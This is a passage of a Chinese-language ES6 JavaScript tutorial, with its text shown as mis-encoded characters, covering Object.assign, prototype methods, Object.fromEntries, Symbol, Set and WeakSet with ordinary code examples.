&#125;</span></span><br></pre></td></tr></table></figure><p><strong>ï¼ˆ3ï¼‰æ•°ç»„çš„å¤„ç†</strong></p><p><code>Object.assign()</code>å¯ä»¥ç”¨æ¥å¤„ç†æ•°ç»„ï¼Œä½†æ˜¯ä¼šæŠŠæ•°ç»„è§†ä¸ºå¯¹è±¡ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Object</span>.assign([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line"><span class="comment">// [4, 5, 3]</span></span><br></pre></td></tr></table></figure><p><strong>ï¼ˆ4ï¼‰å–å€¼å‡½æ•°çš„å¤„ç†</strong></p><p><code>Object.assign()</code>åªèƒ½è¿›è¡Œå€¼çš„å¤åˆ¶ï¼Œå¦‚æœè¦å¤åˆ¶çš„å€¼æ˜¯ä¸€ä¸ªå–å€¼å‡½æ•°ï¼Œé‚£ä¹ˆå°†æ±‚å€¼åå†å¤åˆ¶ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> source = &#123;</span><br><span class="line">  <span class="keyword">get</span> <span class="title">foo</span>() &#123; <span class="keyword">return</span> <span class="number">1</span> &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> target = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.assign(target, source)</span><br><span class="line"><span class="comment">// &#123; foo: 1 &#125;</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>source</code>å¯¹è±¡çš„<code>foo</code>å±æ€§æ˜¯ä¸€ä¸ªå–å€¼å‡½æ•°ï¼Œ<code>Object.assign()</code>ä¸ä¼šå¤åˆ¶è¿™ä¸ªå–å€¼å‡½æ•°ï¼Œåªä¼šæ‹¿åˆ°å€¼ä»¥åï¼Œå°†è¿™ä¸ªå€¼å¤åˆ¶è¿‡å»ã€‚</p><h3 id="å¸¸è§ç”¨é€”"><a href="#å¸¸è§ç”¨é€”" class="headerlink" title="å¸¸è§ç”¨é€”"></a>å¸¸è§ç”¨é€”</h3><p><strong>ï¼ˆ1ï¼‰ä¸ºå¯¹è±¡æ·»åŠ å±æ€§</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">x, y</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">Object</span>.assign(<span class="built_in">this</span>, &#123;x, y&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ï¼ˆ2ï¼‰ä¸ºå¯¹è±¡æ·»åŠ æ–¹æ³•</strong></p><p><strong>ï¼ˆ3ï¼‰å…‹éš†å¯¹è±¡</strong></p><p><strong>ï¼ˆ4ï¼‰åˆå¹¶å¤šä¸ªå¯¹è±¡</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> merge =</span><br><span class="line">  <span class="function">(<span class="params">...sources</span>) =&gt;</span> <span class="built_in">Object</span>.assign(&#123;&#125;, ...sources);</span><br></pre></td></tr></table></figure><p><strong>ï¼ˆ5ï¼‰ä¸ºå±æ€§æŒ‡å®šé»˜è®¤å€¼</strong></p><h2 id="3ã€-proto-å±æ€§ï¼ŒObject-setPrototypeOf-ï¼ŒObject-getPrototypeOf"><a href="#3ã€-proto-å±æ€§ï¼ŒObject-setPrototypeOf-ï¼ŒObject-getPrototypeOf" class="headerlink" title="3ã€__proto__å±æ€§ï¼ŒObject.setPrototypeOf()ï¼ŒObject.getPrototypeOf()"></a>3ã€__proto__å±æ€§ï¼ŒObject.setPrototypeOf()ï¼ŒObject.getPrototypeOf()</h2><h3 id="proto-å±æ€§"><a href="#proto-å±æ€§" class="headerlink" title="__proto__å±æ€§"></a>__proto__å±æ€§</h3><p><code>__proto__</code>å±æ€§ç”¨æ¥è¯»å–æˆ–è®¾ç½®å½“å‰å¯¹è±¡çš„åŸå‹å¯¹è±¡ï¼ˆprototypeï¼‰ã€‚</p><h3 id="Object-setPrototypeOf"><a href="#Object-setPrototypeOf" class="headerlink" title="Object.setPrototypeOf()"></a>Object.setPrototypeOf()</h3><p><code>Object.setPrototypeOf</code>æ–¹æ³•çš„ä½œç”¨ä¸<code>__proto__</code>ç›¸åŒï¼Œç”¨æ¥è®¾ç½®ä¸€ä¸ªå¯¹è±¡çš„åŸå‹å¯¹è±¡ï¼ˆprototypeï¼‰ï¼Œè¿”å›å‚æ•°å¯¹è±¡æœ¬èº«ã€‚å®ƒæ˜¯ ES6 æ­£å¼æ¨èçš„è®¾ç½®åŸå‹å¯¹è±¡çš„æ–¹æ³•ã€‚ç­‰åŒäºä¸‹é¢çš„å‡½æ•°ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setPrototypeOf</span>(<span class="params">obj, proto</span>) </span>&#123;</span><br><span class="line">  obj.__proto__ = proto;</span><br><span class="line">  <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> proto = &#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> obj = &#123; <span class="attr">x</span>: <span class="number">10</span> &#125;;</span><br><span class="line"><span class="built_in">Object</span>.setPrototypeOf(obj, proto);</span><br><span class="line"></span><br><span class="line">proto.y = <span class="number">20</span>;</span><br><span class="line">proto.z = <span class="number">40</span>;</span><br><span class="line"></span><br><span class="line">obj.x <span class="comment">// 10</span></span><br><span class="line">obj.y <span class="comment">// 20</span></span><br><span class="line">obj.z <span class="comment">// 40</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç å°†<code>proto</code>å¯¹è±¡è®¾ä¸º<code>obj</code>å¯¹è±¡çš„åŸå‹ï¼Œæ‰€ä»¥ä»<code>obj</code>å¯¹è±¡å¯ä»¥è¯»å–<code>proto</code>å¯¹è±¡çš„å±æ€§ã€‚</p><h3 id="Object-getPrototypeOf"><a href="#Object-getPrototypeOf" class="headerlink" title="Object.getPrototypeOf()"></a>Object.getPrototypeOf()</h3><p>è¯¥æ–¹æ³•ç”¨äºè¯»å–ä¸€ä¸ªå¯¹è±¡çš„åŸå‹å¯¹è±¡ã€‚</p><h2 id="5ã€Object-keys-ï¼ŒObject-values-ï¼ŒObject-entries"><a href="#5ã€Object-keys-ï¼ŒObject-values-ï¼ŒObject-entries" class="headerlink" title="5ã€Object.keys()ï¼ŒObject.values()ï¼ŒObject.entries()"></a>5ã€Object.keys()ï¼ŒObject.values()ï¼ŒObject.entries()</h2><p>åŒæ•°ç»„çš„æ‰©å±•ã€‚</p><h2 id="6ã€Object-fromEntries"><a href="#6ã€Object-fromEntries" class="headerlink" title="6ã€Object.fromEntries()"></a>6ã€Object.fromEntries()</h2><p><code>Object.fromEntries()</code>æ–¹æ³•æ˜¯<code>Object.entries()</code>çš„é€†æ“ä½œï¼Œç”¨äºå°†ä¸€ä¸ªé”®å€¼å¯¹æ•°ç»„è½¬ä¸ºå¯¹è±¡ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Object</span>.fromEntries([</span><br><span class="line">  [<span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;bar&#x27;</span>],</span><br><span class="line">  [<span class="string">&#x27;baz&#x27;</span>, <span class="number">42</span>]</span><br><span class="line">])</span><br><span class="line"><span class="comment">// &#123; foo: &quot;bar&quot;, baz: 42 &#125;</span></span><br></pre></td></tr></table></figure><p>ç‰¹åˆ«é€‚åˆå°† Map ç»“æ„è½¬ä¸ºå¯¹è±¡ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ä¾‹ä¸€</span></span><br><span class="line"><span class="keyword">const</span> entries = <span class="keyword">new</span> <span class="built_in">Map</span>([</span><br><span class="line">  [<span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;bar&#x27;</span>],</span><br><span class="line">  [<span class="string">&#x27;baz&#x27;</span>, <span class="number">42</span>]</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.fromEntries(entries)</span><br><span class="line"><span class="comment">// &#123; foo: &quot;bar&quot;, baz: 42 &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¾‹äºŒ</span></span><br><span class="line"><span class="keyword">const</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>().set(<span class="string">&#x27;foo&#x27;</span>, <span class="literal">true</span>).set(<span class="string">&#x27;bar&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line"><span class="built_in">Object</span>.fromEntries(map)</span><br><span class="line"><span class="comment">// &#123; foo: true, bar: false &#125;</span></span><br></pre></td></tr></table></figure><h1 id="Symbol"><a href="#Symbol" class="headerlink" title="Symbol"></a>Symbol</h1><h2 id="1ã€æ¦‚è¿°"><a href="#1ã€æ¦‚è¿°" class="headerlink" title="1ã€æ¦‚è¿°"></a>1ã€æ¦‚è¿°</h2><p>ES6 å¼•å…¥äº†ä¸€ç§æ–°çš„åŸå§‹æ•°æ®ç±»å‹<code>Symbol</code>ï¼Œè¡¨ç¤ºç‹¬ä¸€æ— äºŒçš„å€¼ã€‚å®ƒæ˜¯ JavaScript è¯­è¨€çš„ç¬¬ä¸ƒç§æ•°æ®ç±»å‹ï¼Œå‰å…­ç§æ˜¯ï¼š<code>undefined</code>ã€<code>null</code>ã€å¸ƒå°”å€¼ï¼ˆBooleanï¼‰ã€å­—ç¬¦ä¸²ï¼ˆStringï¼‰ã€æ•°å€¼ï¼ˆNumberï¼‰ã€å¯¹è±¡ï¼ˆObjectï¼‰ã€‚</p><p>Symbol å€¼é€šè¿‡<code>Symbol</code>å‡½æ•°ç”Ÿæˆã€‚è¿™å°±æ˜¯è¯´ï¼Œå¯¹è±¡çš„å±æ€§åç°åœ¨å¯ä»¥æœ‰ä¸¤ç§ç±»å‹ï¼Œä¸€ç§æ˜¯åŸæ¥å°±æœ‰çš„å­—ç¬¦ä¸²ï¼Œå¦ä¸€ç§å°±æ˜¯æ–°å¢çš„ Symbol ç±»å‹ã€‚å‡¡æ˜¯å±æ€§åå±äº Symbol ç±»å‹ï¼Œå°±éƒ½æ˜¯ç‹¬ä¸€æ— äºŒçš„ï¼Œå¯ä»¥ä¿è¯ä¸ä¼šä¸å…¶ä»–å±æ€§åäº§ç”Ÿå†²çªã€‚</p><p>æ³¨æ„ï¼Œ<code>Symbol</code>å‡½æ•°å‰ä¸èƒ½ä½¿ç”¨<code>new</code>å‘½ä»¤ï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚è¿™æ˜¯å› ä¸ºç”Ÿæˆçš„ Symbol æ˜¯ä¸€ä¸ªåŸå§‹ç±»å‹çš„å€¼ï¼Œä¸æ˜¯å¯¹è±¡ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œç”±äº Symbol å€¼ä¸æ˜¯å¯¹è±¡ï¼Œæ‰€ä»¥ä¸èƒ½æ·»åŠ å±æ€§ã€‚</p><h2 id="2ã€ä½œä¸ºå±æ€§åçš„-Symbol"><a href="#2ã€ä½œä¸ºå±æ€§åçš„-Symbol" class="headerlink" title="2ã€ä½œä¸ºå±æ€§åçš„ Symbol"></a>2ã€ä½œä¸ºå±æ€§åçš„ Symbol</h2><p>ç”±äºæ¯ä¸€ä¸ª Symbol å€¼éƒ½æ˜¯ä¸ç›¸ç­‰çš„ï¼Œè¿™æ„å‘³ç€ Symbol å€¼å¯ä»¥ä½œä¸ºæ ‡è¯†ç¬¦ï¼Œç”¨äºå¯¹è±¡çš„å±æ€§åï¼Œå°±èƒ½ä¿è¯ä¸ä¼šå‡ºç°åŒåçš„å±æ€§ã€‚è¿™å¯¹äºä¸€ä¸ªå¯¹è±¡ç”±å¤šä¸ªæ¨¡å—æ„æˆçš„æƒ…å†µéå¸¸æœ‰ç”¨ï¼Œèƒ½é˜²æ­¢æŸä¸€ä¸ªé”®è¢«ä¸å°å¿ƒæ”¹å†™æˆ–è¦†ç›–ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> mySymbol = <span class="built_in">Symbol</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç¬¬ä¸€ç§å†™æ³•</span></span><br><span class="line"><span class="keyword">let</span> a = &#123;&#125;;</span><br><span class="line">a[mySymbol] = <span class="string">&#x27;Hello!&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç¬¬äºŒç§å†™æ³•</span></span><br><span class="line"><span class="keyword">let</span> a = &#123;</span><br><span class="line">  [mySymbol]: <span class="string">&#x27;Hello!&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç¬¬ä¸‰ç§å†™æ³•</span></span><br><span class="line"><span class="keyword">let</span> a = &#123;&#125;;</span><br><span class="line"><span class="built_in">Object</span>.defineProperty(a, mySymbol, &#123; <span class="attr">value</span>: <span class="string">&#x27;Hello!&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä»¥ä¸Šå†™æ³•éƒ½å¾—åˆ°åŒæ ·ç»“æœ</span></span><br><span class="line">a[mySymbol] <span class="comment">// &quot;Hello!&quot;</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼ŒSymbol å€¼ä½œä¸ºå¯¹è±¡å±æ€§åæ—¶ï¼Œä¸èƒ½ç”¨ç‚¹è¿ç®—ç¬¦ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> mySymbol = <span class="built_in">Symbol</span>();</span><br><span class="line"><span class="keyword">const</span> a = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">a.mySymbol = <span class="string">&#x27;Hello!&#x27;</span>;</span><br><span class="line">a[mySymbol] <span class="comment">// undefined</span></span><br><span class="line">a[<span class="string">&#x27;mySymbol&#x27;</span>] <span class="comment">// &quot;Hello!&quot;</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ä¸­ï¼Œå› ä¸ºç‚¹è¿ç®—ç¬¦åé¢æ€»æ˜¯å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥ä¸ä¼šè¯»å–<code>mySymbol</code>ä½œä¸ºæ ‡è¯†åæ‰€æŒ‡ä»£çš„é‚£ä¸ªå€¼ï¼Œå¯¼è‡´<code>a</code>çš„å±æ€§åå®é™…ä¸Šæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè€Œä¸æ˜¯ä¸€ä¸ª Symbol å€¼ã€‚</p><h2 id="3ã€å±æ€§åçš„éå†"><a href="#3ã€å±æ€§åçš„éå†" class="headerlink" title="3ã€å±æ€§åçš„éå†"></a>3ã€å±æ€§åçš„éå†</h2><p>Symbol ä½œä¸ºå±æ€§åï¼Œéå†å¯¹è±¡çš„æ—¶å€™ï¼Œè¯¥å±æ€§ä¸ä¼šå‡ºç°åœ¨<code>for...in</code>ã€<code>for...of</code>å¾ªç¯ä¸­ï¼Œä¹Ÿä¸ä¼šè¢«<code>Object.keys()</code>ã€<code>Object.getOwnPropertyNames()</code>ã€<code>JSON.stringify()</code>è¿”å›ã€‚</p><p>ä½†æ˜¯ï¼Œå®ƒä¹Ÿä¸æ˜¯ç§æœ‰å±æ€§ï¼Œæœ‰ä¸€ä¸ª<code>Object.getOwnPropertySymbols()</code>æ–¹æ³•ï¼Œå¯ä»¥è·å–æŒ‡å®šå¯¹è±¡çš„æ‰€æœ‰ Symbol å±æ€§åã€‚è¯¥æ–¹æ³•è¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œæˆå‘˜æ˜¯å½“å‰å¯¹è±¡çš„æ‰€æœ‰ç”¨ä½œå±æ€§åçš„ Symbol å€¼ã€‚</p><p>å¦ä¸€ä¸ªæ–°çš„ APIï¼Œ<code>Reflect.ownKeys()</code>æ–¹æ³•å¯ä»¥è¿”å›æ‰€æœ‰ç±»å‹çš„é”®åï¼ŒåŒ…æ‹¬å¸¸è§„é”®åå’Œ Symbol é”®åã€‚</p><h1 id="Set-å’Œ-Map-æ•°æ®ç»“æ„"><a href="#Set-å’Œ-Map-æ•°æ®ç»“æ„" class="headerlink" title="Set å’Œ Map æ•°æ®ç»“æ„"></a>Set å’Œ Map æ•°æ®ç»“æ„</h1><h2 id="1ã€Set"><a href="#1ã€Set" class="headerlink" title="1ã€Set"></a>1ã€Set</h2><h3 id="åŸºæœ¬ç”¨æ³•-5"><a href="#åŸºæœ¬ç”¨æ³•-5" class="headerlink" title="åŸºæœ¬ç”¨æ³•"></a>åŸºæœ¬ç”¨æ³•</h3><p>ES6 æä¾›äº†æ–°çš„æ•°æ®ç»“æ„ Setã€‚å®ƒç±»ä¼¼äºæ•°ç»„ï¼Œä½†æ˜¯æˆå‘˜çš„å€¼éƒ½æ˜¯å”¯ä¸€çš„ï¼Œæ²¡æœ‰é‡å¤çš„å€¼ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> s = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line"></span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">2</span>].forEach(<span class="function"><span class="params">x</span> =&gt;</span> s.add(x));</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">of</span> s) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 2 3 5 4</span></span><br></pre></td></tr></table></figure><p><code>Set</code>å‡½æ•°å¯ä»¥æ¥å—ä¸€ä¸ªæ•°ç»„ï¼ˆæˆ–è€…å…·æœ‰ iterable æ¥å£çš„å…¶ä»–æ•°æ®ç»“æ„ï¼‰ä½œä¸ºå‚æ•°ï¼Œç”¨æ¥åˆå§‹åŒ–ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> set = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">4</span>]);</span><br><span class="line">[...set]</span><br><span class="line"><span class="comment">// [1, 2, 3, 4] æ•°ç»„å»é‡</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„æ–¹æ³•ä¹Ÿå¯ä»¥ç”¨äºï¼Œå»é™¤å­—ç¬¦ä¸²é‡Œé¢çš„é‡å¤å­—ç¬¦ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">[...new <span class="built_in">Set</span>(<span class="string">&#x27;ababbc&#x27;</span>)].join(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">// &quot;abc&quot;</span></span><br></pre></td></tr></table></figure><p>åœ¨ Set å†…éƒ¨ï¼Œä¸¤ä¸ª<code>NaN</code>æ˜¯ç›¸ç­‰çš„ï¼Œä¸¤ä¸ªå¯¹è±¡æ€»æ˜¯ä¸ç›¸ç­‰çš„ã€‚</p><h3 id="Set-å®ä¾‹çš„å±æ€§å’Œæ–¹æ³•"><a href="#Set-å®ä¾‹çš„å±æ€§å’Œæ–¹æ³•" class="headerlink" title="Set å®ä¾‹çš„å±æ€§å’Œæ–¹æ³•"></a>Set å®ä¾‹çš„å±æ€§å’Œæ–¹æ³•</h3><p>Set ç»“æ„çš„å®ä¾‹æœ‰ä»¥ä¸‹å±æ€§ã€‚</p><ul><li><code>Set.prototype.constructor</code>ï¼šæ„é€ å‡½æ•°ï¼Œé»˜è®¤å°±æ˜¯<code>Set</code>å‡½æ•°ã€‚</li><li><code>Set.prototype.size</code>ï¼šè¿”å›<code>Set</code>å®ä¾‹çš„æˆå‘˜æ€»æ•°ã€‚</li></ul><p>Set å®ä¾‹çš„æ–¹æ³•åˆ†ä¸ºä¸¤å¤§ç±»ï¼šæ“ä½œæ–¹æ³•ï¼ˆç”¨äºæ“ä½œæ•°æ®ï¼‰å’Œéå†æ–¹æ³•ï¼ˆç”¨äºéå†æˆå‘˜ï¼‰ã€‚ä¸‹é¢å…ˆä»‹ç»å››ä¸ªæ“ä½œæ–¹æ³•ã€‚</p><ul><li><code>Set.prototype.add(value)</code>ï¼šæ·»åŠ æŸä¸ªå€¼ï¼Œè¿”å› Set ç»“æ„æœ¬èº«ã€‚</li><li><code>Set.prototype.delete(value)</code>ï¼šåˆ é™¤æŸä¸ªå€¼ï¼Œè¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºåˆ é™¤æ˜¯å¦æˆåŠŸã€‚</li><li><code>Set.prototype.has(value)</code>ï¼šè¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºè¯¥å€¼æ˜¯å¦ä¸º<code>Set</code>çš„æˆå‘˜ã€‚</li><li><code>Set.prototype.clear()</code>ï¼šæ¸…é™¤æ‰€æœ‰æˆå‘˜ï¼Œæ²¡æœ‰è¿”å›å€¼ã€‚</li></ul><p><code>Array.from</code>æ–¹æ³•å¯ä»¥å°† Set ç»“æ„è½¬ä¸ºæ•°ç»„ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> items = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]);</span><br><span class="line"><span class="keyword">const</span> array = <span class="built_in">Array</span>.from(items);</span><br></pre></td></tr></table></figure><p>è¿™å°±æä¾›äº†å»é™¤æ•°ç»„é‡å¤æˆå‘˜çš„å¦ä¸€ç§æ–¹æ³•ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dedupe</span>(<span class="params">array</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Array</span>.from(<span class="keyword">new</span> <span class="built_in">Set</span>(array));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dedupe([<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]) <span class="comment">// [1, 2, 3]</span></span><br></pre></td></tr></table></figure><h3 id="éå†æ“ä½œ"><a href="#éå†æ“ä½œ" class="headerlink" title="éå†æ“ä½œ"></a>éå†æ“ä½œ</h3><p>Set ç»“æ„çš„å®ä¾‹æœ‰å››ä¸ªéå†æ–¹æ³•ï¼Œå¯ä»¥ç”¨äºéå†æˆå‘˜ã€‚ç”±äº Set ç»“æ„æ²¡æœ‰é”®åï¼Œåªæœ‰é”®å€¼ï¼Œæ‰€ä»¥<code>keys</code>æ–¹æ³•å’Œ<code>values</code>æ–¹æ³•çš„è¡Œä¸ºå®Œå…¨ä¸€è‡´ã€‚</p><ul><li><code>Set.prototype.keys()</code>ï¼šè¿”å›é”®åçš„éå†å™¨</li><li><code>Set.prototype.values()</code>ï¼šè¿”å›é”®å€¼çš„éå†å™¨</li><li><code>Set.prototype.entries()</code>ï¼šè¿”å›é”®å€¼å¯¹çš„éå†å™¨</li><li><code>Set.prototype.forEach()</code>ï¼šä½¿ç”¨å›è°ƒå‡½æ•°éå†æ¯ä¸ªæˆå‘˜</li></ul><p><strong>éå†çš„åº”ç”¨</strong></p><p><strong>æ‰©å±•è¿ç®—ç¬¦ï¼ˆ<code>...</code>ï¼‰å†…éƒ¨ä½¿ç”¨<code>for...of</code>å¾ªç¯</strong></p><p>ä½¿ç”¨ Set å¯ä»¥å¾ˆå®¹æ˜“åœ°å®ç°å¹¶é›†ï¼ˆUnionï¼‰ã€äº¤é›†ï¼ˆIntersectï¼‰å’Œå·®é›†ï¼ˆDifferenceï¼‰ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]);</span><br><span class="line"><span class="keyword">let</span> b = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¹¶é›†</span></span><br><span class="line"><span class="keyword">let</span> union = <span class="keyword">new</span> <span class="built_in">Set</span>([...a, ...b]);</span><br><span class="line"><span class="comment">// Set &#123;1, 2, 3, 4&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// äº¤é›†</span></span><br><span class="line"><span class="keyword">let</span> intersect = <span class="keyword">new</span> <span class="built_in">Set</span>([...a].filter(<span class="function"><span class="params">x</span> =&gt;</span> b.has(x)));</span><br><span class="line"><span class="comment">// set &#123;2, 3&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ï¼ˆa ç›¸å¯¹äº b çš„ï¼‰å·®é›†</span></span><br><span class="line"><span class="keyword">let</span> difference = <span class="keyword">new</span> <span class="built_in">Set</span>([...a].filter(<span class="function"><span class="params">x</span> =&gt;</span> !b.has(x)));</span><br><span class="line"><span class="comment">// Set &#123;1&#125;</span></span><br></pre></td></tr></table></figure><h2 id="2ã€WeakSet"><a href="#2ã€WeakSet" class="headerlink" title="2ã€WeakSet"></a>2ã€WeakSet</h2><h3 id="å«ä¹‰-1"><a href="#å«ä¹‰-1" class="headerlink" title="å«ä¹‰"></a>å«ä¹‰</h3><p>WeakSet ç»“æ„ä¸ Set ç±»ä¼¼ï¼Œä¹Ÿæ˜¯ä¸é‡å¤çš„å€¼çš„é›†åˆã€‚ä½†æ˜¯ï¼Œå®ƒä¸ Set æœ‰ä¸¤ä¸ªåŒºåˆ«ã€‚</p><ul><li>é¦–å…ˆï¼ŒWeakSet çš„æˆå‘˜åªèƒ½æ˜¯å¯¹è±¡ï¼Œè€Œä¸èƒ½æ˜¯å…¶ä»–ç±»å‹çš„å€¼ã€‚</li><li>å…¶æ¬¡ï¼ŒWeakSet ä¸­çš„å¯¹è±¡éƒ½æ˜¯å¼±å¼•ç”¨ï¼Œå³<strong>åƒåœ¾å›æ”¶æœºåˆ¶ä¸è€ƒè™‘ WeakSet å¯¹è¯¥å¯¹è±¡çš„å¼•ç”¨</strong>ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœå…¶ä»–å¯¹è±¡éƒ½ä¸å†å¼•ç”¨è¯¥å¯¹è±¡ï¼Œé‚£ä¹ˆåƒåœ¾å›æ”¶æœºåˆ¶ä¼šè‡ªåŠ¨å›æ”¶è¯¥å¯¹è±¡æ‰€å ç”¨çš„å†…å­˜ï¼Œä¸è€ƒè™‘è¯¥å¯¹è±¡è¿˜å­˜åœ¨äº WeakSet ä¹‹ä¸­ã€‚</li></ul><p>å› æ­¤ï¼ŒWeakSet é€‚åˆä¸´æ—¶å­˜æ”¾ä¸€ç»„å¯¹è±¡ï¼Œä»¥åŠå­˜æ”¾è·Ÿå¯¹è±¡ç»‘å®šçš„ä¿¡æ¯ã€‚åªè¦è¿™äº›å¯¹è±¡åœ¨å¤–éƒ¨æ¶ˆå¤±ï¼Œå®ƒåœ¨ WeakSet é‡Œé¢çš„å¼•ç”¨å°±ä¼šè‡ªåŠ¨æ¶ˆå¤±ã€‚ç”±äºä¸Šé¢è¿™ä¸ªç‰¹ç‚¹ï¼ŒWeakSet çš„æˆå‘˜æ˜¯ä¸é€‚åˆå¼•ç”¨çš„ï¼Œå› ä¸ºå®ƒä¼šéšæ—¶æ¶ˆå¤±ã€‚å¦å¤–ï¼Œç”±äº WeakSet å†…éƒ¨æœ‰å¤šå°‘ä¸ªæˆå‘˜ï¼Œå–å†³äºåƒåœ¾å›æ”¶æœºåˆ¶æœ‰æ²¡æœ‰è¿è¡Œï¼Œè¿è¡Œå‰åå¾ˆå¯èƒ½æˆå‘˜ä¸ªæ•°æ˜¯ä¸ä¸€æ ·çš„ï¼Œè€Œåƒåœ¾å›æ”¶æœºåˆ¶ä½•æ—¶è¿è¡Œæ˜¯ä¸å¯é¢„æµ‹çš„ï¼Œå› æ­¤ ES6 è§„å®š <strong>WeakSet ä¸å¯éå†</strong>ã€‚</p><h3 id="è¯­æ³•"><a href="#è¯­æ³•" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><p>ä½œä¸ºæ„é€ å‡½æ•°ï¼ŒWeakSet å¯ä»¥æ¥å—ä¸€ä¸ªæ•°ç»„æˆ–ç±»ä¼¼æ•°ç»„çš„å¯¹è±¡ä½œä¸ºå‚æ•°ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> a = [[<span class="number">1</span>, <span class="number">2</span>], [<span class="number">3</span>, <span class="number">4</span>]];</span><br><span class="line"><span class="keyword">const</span> ws = <span class="keyword">new</span> <span class="built_in">WeakSet</span>(a);</span><br><span class="line"><span class="comment">// WeakSet &#123;[1, 2], [3, 4]&#125;</span></span><br></pre></td></tr></table></figure><p>WeakSet ç»“æ„æœ‰ä»¥ä¸‹ä¸‰ä¸ªæ–¹æ³•ã€‚</p><ul><li>**WeakSet.prototype.add(value)**ï¼šå‘ WeakSet å®ä¾‹æ·»åŠ ä¸€ä¸ªæ–°æˆå‘˜ã€‚</li><li>**WeakSet.prototype.delete(value)**ï¼šæ¸…é™¤ WeakSet 